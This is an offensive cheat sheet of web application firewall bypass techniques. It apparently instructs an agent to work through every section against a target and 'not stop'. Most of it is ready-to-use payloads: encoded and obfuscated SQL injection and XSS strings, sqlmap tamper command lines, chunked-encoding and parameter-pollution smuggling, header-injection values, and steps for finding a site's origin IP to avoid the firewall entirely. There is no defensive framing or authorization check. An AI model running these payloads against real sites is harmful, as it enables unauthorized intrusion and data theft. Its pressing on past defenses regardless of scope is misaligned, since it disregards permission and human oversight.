# WAF Bypass Arsenal — Exhaustive Techniques & Payloads

**Every WAF is bypassable. Humans wrote it. Humans make mistakes. Keep trying.**

**Read this file when a WAF is blocking you. Work through EVERY section. Do NOT stop.**

---

## 1. IDENTIFY THE WAF FIRST

```bash
# Automated identification
wafw00f https://TARGET
# Manual: check these headers in Burp responses
# Cloudflare: cf-ray, CF-RAY, server: cloudflare
# Akamai: x-akamai-*, akamai-grn
# AWS WAF: x-amzn-requestid, x-amz-cf-id
# Imperva/Incapsula: x-iinfo, visid_incap_*
# F5 BIG-IP: x-wa-info, BigIP server cookie
# Sucuri: x-sucuri-id, x-sucuri-cache
# ModSecurity: server header, error page format
# Barracuda: barra_counter_session cookie
# Fortinet: FORTIWAFSID cookie
```

Then WebSearch: "[WAF name] bypass 2025 2026" — ALWAYS research the specific WAF.

---

## 2. ENCODING TECHNIQUES (try ALL of these)

### URL Encoding
```
' → %27
< → %3C
> → %3E
" → %22
/ → %2F
= → %3D
( → %28
) → %29
```

### Double URL Encoding
```
' → %2527
< → %253C
> → %253E
```

### Triple URL Encoding
```
' → %252527
```

### Unicode Encoding
```
' → %u0027
< → %u003C
> → %u003E
' → \u0027
< → \u003c
```

### Unicode Fullwidth Characters (visual confusables)
```
< → ＜ (U+FF1C)
> → ＞ (U+FF1E)
' → ＇ (U+FF07)
" → ＂ (U+FF02)
( → （ (U+FF08)
) → ） (U+FF09)
/ → ／ (U+FF0F)
```

### Unicode Normalization Bypass (NFC vs NFKC)
```
If WAF uses NFC but backend uses NFKC:
  ﬀ → ff (U+FB00 decomposes to ff)
  ﬁ → fi (U+FB01)
  ﬂ → fl (U+FB02)
  ℌ → H (U+210C)
  ℛ → R (U+211B)
  Use: ＜ℌcript＞ → backend sees <script>
```

### HTML Entity Encoding
```
' → &#39; &#x27; &#039;
< → &#60; &#x3C; &#060;
> → &#62; &#x3E; &#062;
" → &#34; &#x22; &#034;
/ → &#47; &#x2F;
```

### HTML Entity with Leading Zeros
```
< → &#0060; &#00060; &#000060;
> → &#0062;
```

### Hex Encoding
```
' → 0x27
< → 0x3C
1 → 0x31
```

### Octal Encoding
```
' → \47
< → \74
```

### Base64 in Parameters
```
payload=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### JSON Unicode Escape
```
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\u0024\u007b7*7\u007d  →  ${7*7}
```

### Mixed Encoding
```
%253Cscript%253E  (double URL + normal)
%u003Cscript>     (unicode + normal)
&#x3C;script&#x3E; (HTML entity + normal)
```

---

## 3. SQL INJECTION BYPASS PAYLOADS

### Whitespace Alternatives
```
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users       (tab)
SELECT%0Ausername%0AFROM%0Ausers       (newline)
SELECT%0Cusername%0CFROM%0Cusers       (form feed)
SELECT%0Dusername%0DFROM%0Dusers       (carriage return)
SELECT(username)FROM(users)             (parentheses)
SELECT+username+FROM+users              (plus sign)
```

### Comment Insertion
```
SEL/**/ECT
UN/**/ION
SE%00LECT                               (null byte)
/*!50000SELECT*/                         (MySQL version comment)
/*!UNION*/+/*!SELECT*/
```

### Case Manipulation
```
SeLeCt, UnIoN, sElEcT
uNiOn SeLeCt
```

### String Concatenation (database-specific)
```
MySQL:   CONCAT('SEL','ECT')  or  'SEL' 'ECT'
MSSQL:   'SEL'+'ECT'
Oracle:  'SEL'||'ECT'
PostgreSQL: 'SEL'||'ECT'
```

### Alternative Functions
```
Instead of UNION SELECT:
  UNION ALL SELECT
  UNION DISTINCT SELECT
  UNION/**/SELECT

Instead of OR 1=1:
  OR 2>1
  OR 'a'='a'
  OR 1 LIKE 1
  OR 1 BETWEEN 0 AND 2
  || 1=1
  OR 0x1=0x1

Instead of AND:
  &&
  %26%26

Instead of information_schema:
  information_schema/**/./**/tables
  `information_schema`.`tables`

Instead of SLEEP():
  BENCHMARK(10000000,SHA1('a'))
  (SELECT * FROM (SELECT(SLEEP(5)))a)
  WAITFOR DELAY '0:0:5' (MSSQL)

Instead of quotes:
  CHAR(39) for '
  0x27 for '
  CHR(39) in Oracle
```

### Stacked Queries with Encoding
```
;%0ASELECT+*+FROM+users
;%0D%0ASELECT * FROM users
```

### sqlmap Tamper Scripts (use multiple together)
```bash
sqlmap -u "URL" --tamper=space2comment,randomcase,between,charunicodeencode
sqlmap -u "URL" --tamper=apostrophemask,equaltolike,space2hash
sqlmap -u "URL" --tamper=space2mssqlblank,percentage,charencode
sqlmap -u "URL" --tamper=space2morehash,space2mysqldash,greatest
# Combine 3-4 tamper scripts for best results
# Use --random-agent to rotate User-Agent
# Use --delay=2 to avoid rate limiting
```

---

## 4. XSS BYPASS PAYLOADS

### Event Handler Variations
```html
<img src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>
<img src=x oneRRor=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<object data=javascript:alert(1)>
<isindex action=javascript:alert(1) type=image>
<math><mtext><table><mglyph><svg onload=alert(1)>
```

### Tag/Attribute Obfuscation
```html
<ScRiPt>alert(1)</sCrIpT>
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>alert`1`</script>                    (template literal)
<script>alert&lpar;1&rpar;</script>          (HTML entities)
<script>\u0061lert(1)</script>               (unicode escape)
<script>window['alert'](1)</script>          (bracket notation)
<script>this['alert'](1)</script>
<script>self['ale'+'rt'](1)</script>         (string concat)
<script>eval('ale'+'rt(1)')</script>
<script>Function('ale'+'rt(1)')()</script>
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<script>[].constructor.constructor('alert(1)')()</script>
```

### SVG-Based (Cloudflare bypass class)
```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>
<svg><script>alert&#40;1&#41;</script></svg>
<svg><a><rect width=100% height=100% /><animate attributeName=href values=javascript:alert(1) />
```

### HTML5 Event Handlers (newer, less blocked)
```html
<button popovertarget=x>click<div popover id=x onbeforetoggle=alert(1)>
<div contenteditable onInput=alert(1)>type here
<div contenteditable onDOMNodeInserted=alert(1)>
<div autofocus onfocusin=alert(1) contenteditable>
```

### Protocol Handlers
```
javascript:alert(1)
javascript:alert`1`
jaVasCriPt:alert(1)
javascript://%0aalert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Encoding Combinations
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

---

## 5. PROTOCOL-LEVEL BYPASS

### HTTP Method Switching
```bash
# If GET is blocked, try:
curl -X POST -d "param=PAYLOAD" URL
curl -X PUT -d "param=PAYLOAD" URL
curl -X PATCH -d "param=PAYLOAD" URL
curl -X OPTIONS URL
curl -X TRACE URL
```

### Content-Type Confusion
```bash
# Switch between these:
Content-Type: application/x-www-form-urlencoded
Content-Type: application/json
Content-Type: multipart/form-data; boundary=----BOUNDARY
Content-Type: application/xml
Content-Type: text/plain
Content-Type: text/xml
# WAF may only inspect one content-type
```

### Multipart Boundary Manipulation
```
Content-Type: multipart/form-data; boundary=----
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Type: multipart/form-data; boundary=AAAA; charset=utf-8
Content-Type: multipart/form-data; boundary=----; extra=junk
# Mutate the boundary — WAF may fail to parse
```

### Chunked Transfer Encoding
```
Transfer-Encoding: chunked

4
UNIO
5
N SEL
4
ECT
1

0

# WAF sees chunks, doesn't reassemble — backend does
```

### HTTP Parameter Pollution
```
# Send same parameter twice:
?id=1&id=UNION+SELECT+1,2,3
# WAF checks first, backend uses last (or vice versa — depends on framework)
# Try both orders
```

### HTTP/2 Specific
```
# HTTP/2 pseudo-headers bypass
:method: POST
:path: /api/endpoint
# H2.TE: Transfer-Encoding survives downgrade
# H2.CL: Content-Length preserved in downgrade
# Test: does WAF inspect HTTP/2 traffic differently than HTTP/1.1?
```

---

## 6. HEADER INJECTION

```bash
# Put payloads in headers WAF doesn't inspect:
X-Forwarded-For: PAYLOAD
X-Originating-IP: PAYLOAD
X-Remote-IP: PAYLOAD
X-Remote-Addr: PAYLOAD
X-Client-IP: PAYLOAD
True-Client-IP: PAYLOAD
Referer: PAYLOAD
User-Agent: PAYLOAD
Accept-Language: PAYLOAD
X-Original-URL: /admin/endpoint       # Path override
X-Rewrite-URL: /admin/endpoint        # Path override
X-Custom-IP-Authorization: 127.0.0.1  # IP whitelist bypass
X-Forwarded-Host: PAYLOAD
```

---

## 7. FIND THE ORIGIN IP (BYPASS WAF ENTIRELY)

```bash
# DNS history
# SecurityTrails, ViewDNS.info, completedns.com

# Certificate search (same cert = same server)
# crt.sh: %.target.com
# Censys/Shodan: search by SSL cert hash

# Email headers (target sends email → reveals origin IP)
# Register, trigger password reset, check email headers

# MX/SPF records
dig MX target.com
dig TXT target.com   # SPF may contain origin IP

# Direct IP scan
# Shodan/Censys: search for response matching target's unique content

# Subdomain resolution
# Some subdomains point directly to origin, bypassing CDN/WAF
subfinder -d target.com | dnsx -a | sort -u
```

---

## 8. WAF-INVISIBLE ATTACK CLASSES

**If you cannot bypass the WAF for injection → hunt vulnerabilities WAFs CANNOT detect:**

```
WAF CANNOT DETECT:
  → IDOR (authorization logic, not payload patterns)
  → Business logic flaws (price manipulation, workflow bypass, step skipping)
  → Race conditions (timing, not payload content)
  → Authentication flaws (token manipulation, session logic)
  → OAuth/OIDC misconfigurations
  → GraphQL authorization bypass
  → Mass assignment
  → Information disclosure (data in normal responses)
  → Subdomain takeover
  → CORS misconfiguration exploitation
  → JWT claim manipulation (valid-looking tokens)
  → API versioning rollback
  → WebSocket attacks (many WAFs don't inspect WS)
  → Insecure direct object references
  → Privilege escalation via parameter tampering

THESE ARE OFTEN HIGHER SEVERITY THAN XSS/SQLI ANYWAY.
```

---

## 9. AUTOMATED BYPASS TOOLS

```bash
# WAF bypass testing
# sqlmap with tamper scripts (see section 3)
# xsstrike: python3 xsstrike.py -u "URL" --skip-dom
# w3af: automated WAF bypass testing
# wafw00f: WAF identification
# bypass-url: 403 bypass attempts
# gobypass403: advanced 403/401 bypass

# Nuclei WAF bypass templates
nuclei -u URL -tags waf -severity critical,high
```
